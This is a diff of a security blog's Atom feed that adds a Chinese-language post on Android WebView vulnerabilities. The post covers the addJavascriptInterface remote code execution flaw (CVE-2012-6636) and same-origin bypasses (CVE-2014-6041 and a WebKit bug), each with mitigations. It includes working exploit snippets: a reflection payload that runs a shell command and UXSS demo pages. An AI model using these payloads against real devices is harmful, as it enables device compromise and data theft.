@@ -4,13 +4,175 @@
  <title>DEVCORE 戴夫寇爾</title>
  <link href="http://devco.re/" rel="self"/>
  <link href="http://devco.re"/>
- <updated>2014-10-01T15:48:58+08:00</updated>
+ <updated>2014-10-14T14:03:58+08:00</updated>
  <id>http://devco.re</id>
  <author>
    <name>DEVCORE</name>
    <email>contact [at] devco.re</email>
  </author>
 
+ 
+ <entry>
+   <title>Android WebView 為你的使用者打開了漏洞之門你知道嗎？</title>
+   <link href="http://devco.re/blog/2014/10/13/android-webview-left-shortcuts-for-hacker/"/>
+   <updated>2014-10-13T00:00:00+08:00</updated>
+   <id>http://devco.re/blog/2014/10/13/android-webview-left-shortcuts-for-hacker</id>
+   <content type="html">
+&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-BtDqPupmJiA/VDy2gz9bkQI/AAAAAAAAAuM/liUV3DXWcuE/s500-no/14773948755_6f8774540b_o.jpg&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-BtDqPupmJiA/VDy2gz9bkQI/AAAAAAAAAuM/liUV3DXWcuE/s500-no/14773948755_6f8774540b_o.jpg&quot; alt=&quot;opened door&quot; title=&quot;opened door&quot; /&gt;&lt;/a&gt;
+[Credit: &lt;a href=&quot;https://www.flickr.com/photos/chrisgold/14773948755/in/photostream/&quot;&gt;Chris Goldberg(flickr)&lt;/a&gt;]&lt;/p&gt;
+
+&lt;p&gt;為了解決在應用程式中顯示網頁的需求，開發者一般會使用到由系統提供的 WebView 元件。而由於 JavaScript 被廣泛應用在網頁上，開發者通常也會把 WebView 處理 JavaScript 的功能打開，好讓大部分網頁能正常運作。但就在開啟這個像是必不可少的 JavaScript 功能時，背後一些由於系統漏洞而引發出來意想不到的風險卻有機會由此而生。接下來的部分將把這些漏洞為大家做個整理。&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;h3 id=&quot;section&quot;&gt;相關漏洞&lt;/h3&gt;
+
+&lt;h4 id=&quot;remote-code-execution&quot;&gt;1. 遠端代碼執行 (Remote Code Execution)&lt;/h4&gt;
+
+&lt;h5 id=&quot;section-1&quot;&gt;風險：木馬跳板，個資被盜&lt;/h5&gt;
+&lt;p&gt;目前有機會發生 RCE 風險都圍繞在 &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface(java.lang.Object, java.lang.String)&quot;&gt;addJavascriptInterface&lt;/a&gt; 這個功能上，該功能原意是為被載入的網頁和原生程式間建立一個”橋樑”，通過預先設定好的介面，讓網頁能呼叫指定的公開函式並取得函式回傳的結果。&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;JsObject&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;Hello World&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;webView&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getSettings&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setJavaScriptEnabled&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;webView&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;addJavascriptInterface&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;JsObject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;injectedObject&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;webView&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;loadUrl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;http://www.example.com/&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;…
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
+       &lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;injectedObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// return &amp;quot;Hello World&amp;quot;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;…&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;像上面的例子裡，網頁能通過預先設定好的 “injectedObject” 介面，呼叫 “toString” 函式，得到 “Hello World” 這個字串。&lt;/p&gt;
+
+&lt;p&gt;其漏洞 &lt;a href=&quot;http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-6636&quot;&gt;CVE-2012-6636&lt;/a&gt; 最早在2012年12月被&lt;a href=&quot;http://50.56.33.56/blog/?p=314&quot;&gt;公佈&lt;/a&gt;出來，攻擊者有機會利用他通過 Java Reflection API 來執行任意代碼。影響 Android 1.X ~ 4.1。&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cmdArgs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;injectedObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getClass&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;java.lang.Runtime&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                              &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getMethod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;getRuntime&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                              &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cmdArgs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;/system/bin/sh&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;-c&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;cat vuln &amp;gt;&amp;gt; attacker.txt&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;其後 Google 在 Android 4.2 開始對 &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface(java.lang.Object, java.lang.String)&quot;&gt;addJavascriptInterface&lt;/a&gt; 的使用方式加了限制，使用時需要在 Java 端把可被網頁執行的公開函式透過 @JavascriptInterface 來標註。並奉勸開發者別在 4.1 或之前的系統上使用 &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface(java.lang.Object, java.lang.String)&quot;&gt;addJavascriptInterface&lt;/a&gt;。&lt;/p&gt;
+
+&lt;p&gt;可是是否開發者只要在受影響的系統上不主動使用 &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface(java.lang.Object, java.lang.String)&quot;&gt;addJavascriptInterface&lt;/a&gt; 就能解決問題呢？答案是否定的。&lt;/p&gt;
+
+&lt;p&gt;在 Android 3.X ~ 4.1 上，WebView 預設會用 &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface(java.lang.Object, java.lang.String)&quot;&gt;addJavascriptInterface&lt;/a&gt; 添加一個叫 “searchBoxJavaBridge_” 的介面。開發者如果沒有注意的話就會同樣會讓使用者陷入風險中。很巧合地，從 Android 3.0 開始 Google 加入了 &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#removeJavascriptInterface(java.lang.String)&quot;&gt;removeJavascriptInterface&lt;/a&gt; 函式讓開發者可以移定指定的介面。所以開發者可以使用該函式在受影響的系統上把 “searchBoxJavaBridge_” 移除。&lt;/p&gt;
+
+&lt;p&gt;除了 “searchBoxJavaBridge_” 外，還有兩個介面會在特定情況下被加到 WebView 中。若使用者有在手機上 [系統設定] 裡的 [協助工具]，打開 [服務] 子分類中的任何一個項目，系統就會對其後建立的 WebView 自動加上 “accessibility” 和 “accessibilityTraversal”這兩個介面。這行為在 Android 4.4 由於&lt;a href=&quot;https://android.googlesource.com/platform/frameworks/base/+/94c0057d67c2e0a4b88a4f735388639210260d0e&quot;&gt;舊版 WebView 被取代&lt;/a&gt;而消失了。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-JOttiWUazYQ/VDwYQnYdK9I/AAAAAAAAAts/Bmfp29QdqCY/w277-h492-no/android_accessibility_service.png&quot; alt=&quot;Android 協助工具服務&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;section-2&quot;&gt;防範&lt;/h4&gt;
+
+&lt;p&gt;作為開發者&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;如非需要，關閉 JavaScript 功能 (預設關閉)&lt;/li&gt;
+  &lt;li&gt;可考慮把網頁當作範本儲存在應用內，再用其他途徑載入資料&lt;/li&gt;
+  &lt;li&gt;在有風險的系統中停用 &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface(java.lang.Object, java.lang.String)&quot;&gt;addJavascriptInterface&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;在有風險的系統中使用 &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#removeJavascriptInterface(java.lang.String)&quot;&gt;removeJavascriptInterface&lt;/a&gt; 移除系統自帶的介面&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;作為使用者&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;如非需要，關閉 [不明的來源] 選項 (預設關閉)&lt;/li&gt;
+  &lt;li&gt;使用 Android 4.2 或以上不受影響的系統&lt;/li&gt;
+  &lt;li&gt;勿在受影響的系統上使用機敏服務或儲存機敏資料&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-4jQ2fAT2JXc/VDwYNA824HI/AAAAAAAAAtg/bF4CIHm5v9M/w295-h492-no/android_unknown_source.png&quot; alt=&quot;Android 不明的來源&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;same-origin-policy-bypass&quot;&gt;2. 繞過同源策略 (Same-Origin Policy bypass)&lt;/h4&gt;
+
+&lt;h5 id=&quot;section-3&quot;&gt;風險：個資被盜&lt;/h5&gt;
+&lt;p&gt;為防止網頁在載入外部資源時引發安全問題，瀏覽器會實作&lt;a href=&quot;https://developer.mozilla.org/zh-TW/docs/Web/JavaScript/Same_origin_policy_for_JavaScript&quot;&gt;同源策略&lt;/a&gt;以限制程式碼和不同網域資源間的互動。&lt;/p&gt;
+
+&lt;p&gt;其中 &lt;a href=&quot;http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6041&quot;&gt;CVE-2014-6041&lt;/a&gt; 漏洞，通過程式在處理 \u0000 (unicode null byte) 時的失誤而繞過了原有的限制。&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;CVE-2014-6041 UXSS DEMO&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;iframe&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;target_frame&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;http://devco.re/&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;button&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;go&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onclick=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;window.open(&amp;#39;\u0000javascript:alert(document.domain)&amp;#39;,&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;#39;target_frame&amp;#39;)&amp;quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;如果上面的網頁是放置在與 &lt;a href=&quot;http://devco.re/&quot;&gt;http://devco.re/&lt;/a&gt; 不同源的地方，正常來說點擊按鈕後會因為 SOP 的關係，該段 JavaScript 無法執行而不會有反應。但在受影響的環境裡則能順利執行並跳出 “devco.re” 這個網域名稱。&lt;/p&gt;
+
+&lt;p&gt;上述問題被發現後沒多久，再由相同研究員發現一個早在多年前已經被修正的 &lt;a href=&quot;http://trac.webkit.org/changeset/96826&quot;&gt;WebKit 臭蟲&lt;/a&gt;仍然出現在 Android 4.3 及之前的版本上。&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;object&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;data&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;http://www.bing.com&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;data&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;javascript:alert(document.domain)&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;innerHTML&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;foobar&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+
+上述的跨來源操作同樣違反了 SOP，應當被拒絕執行。但他卻能在有風險的 WebView 上被執行，造成風險。&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;section-4&quot;&gt;防範&lt;/h4&gt;
+
+&lt;p&gt;作為開發者&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;如非需要，關閉 JavaScript 功能 (預設關閉)&lt;/li&gt;
+  &lt;li&gt;可考慮把網頁當作範本儲存在應用內，再用其他途徑載入資料&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;作為使用者&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;如非需要，關閉 [不明的來源] 選項 (預設關閉)&lt;/li&gt;
+  &lt;li&gt;使用 Android 4.4 或以上不受影響的系統&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;section-5&quot;&gt;結語&lt;/h3&gt;
+
+&lt;p&gt;談到這裡大家可能會有個疑問，如果應用程式中所載入的遠端網頁網址都是固定，受開發者控制的，應該就會安全沒有風險。還記得在 &lt;a href=&quot;http://devco.re/blog/2014/08/15/ssl-mishandling-on-mobile-app-development/&quot;&gt;被忽略的 SSL 處理&lt;/a&gt; 裡提及過的中間人攻擊嗎？如果連線過程是採用文明的 HTTP ，或是加密的 HTTPS 但沒落實做好憑證檢查，內容就有機會被攻擊者竊取修改，再結合上面提到的漏洞，對使用者帶來的影響則大大增加。&lt;/p&gt;
+
+&lt;p&gt;下面我們製作了一段結合中間人攻擊與 addJavascriptInterface 漏洞，模擬使用者手機被入侵的影片：&lt;/p&gt;
+&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;http://www.youtube.com/embed/reKEu-Ajo50&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;
+&lt;p&gt;&lt;br /&gt;
+從影片的最後可以看到，攻擊者取得存在漏洞的應用程式權限，並取得裡面的機敏資料。&lt;/p&gt;
+
+&lt;p&gt;而在繞過同源策略問題上，無論是透過 null byte 或是設定屬性來達到，其實都是屬於存在已久的手法，多年前在別的平台、瀏覽器上就已經發生過，除了編寫上的疏忽外，缺乏一個完整的測試流
+程去做檢查相信也是其中一個原因。&lt;/p&gt;
+
+&lt;p&gt;Android 的生態系統問題，使得大多數的使用者手機未能跟得上系統更新的步驟，讓他們即使知道自己所使用系統存在問題也愛莫能助。&lt;/p&gt;
+
+&lt;p&gt;作為開發商，應需要在系統支援度與其相應存在的安全風險中取得平衡，來決定應用程式所支援的最低版本為何。
+最後作為一個負責任的開發者，應為已被公開的漏洞做好應對措施，避免使用者暴露在風險當中。&lt;/p&gt;
+
+&lt;h3 id=&quot;section-6&quot;&gt;參考&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;http://50.56.33.56/blog/?p=314&quot;&gt;Abusing WebView JavaScript Bridges&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://www.rafayhackingarticles.net/2014/08/android-browser-same-origin-policy.html&quot;&gt;Android Browser Same Origin Policy Bypass &amp;lt; 4.4 - CVE-2014-6041&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://www.rafayhackingarticles.net/2014/10/a-tale-of-another-sop-bypass-in-android.html&quot;&gt;A Tale Of Another SOP Bypass In Android Browser &amp;lt; 4.4&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+</content>
+ </entry>
  
  <entry>
    <title>Shellshock (Bash CVE-2014-6271) 威脅仍在擴大中，但無需過度恐慌</title>
@@ -660,7 +822,7 @@ command=&quot;[path]/gl-auth-command sitaram&quot;,[more options] ssh-rsa AAAAB3
 &lt;span class=&quot;lineno&quot;&gt;41&lt;/span&gt;                         &lt;span class=&quot;nl&quot;&gt;forAuthenticationChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
 &lt;span class=&quot;lineno&quot;&gt;42&lt;/span&gt;         &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;span class=&quot;lineno&quot;&gt;43&lt;/span&gt;     &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;44&lt;/span&gt;     
+&lt;span class=&quot;lineno&quot;&gt;44&lt;/span&gt; 
 &lt;span class=&quot;lineno&quot;&gt;45&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;// Bad dog&lt;/span&gt;
 &lt;span class=&quot;lineno&quot;&gt;46&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;cancelAuthenticationChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
 &lt;span class=&quot;lineno&quot;&gt;47&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
@@ -698,16 +860,16 @@ command=&quot;[path]/gl-auth-command sitaram&quot;,[more options] ssh-rsa AAAAB3
 &lt;span class=&quot;lineno&quot;&gt;11&lt;/span&gt;                 &lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengeCancelAuthenticationChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;span class=&quot;lineno&quot;&gt;12&lt;/span&gt;                 &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;lineno&quot;&gt;13&lt;/span&gt;             &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;14&lt;/span&gt;             
+&lt;span class=&quot;lineno&quot;&gt;14&lt;/span&gt; 
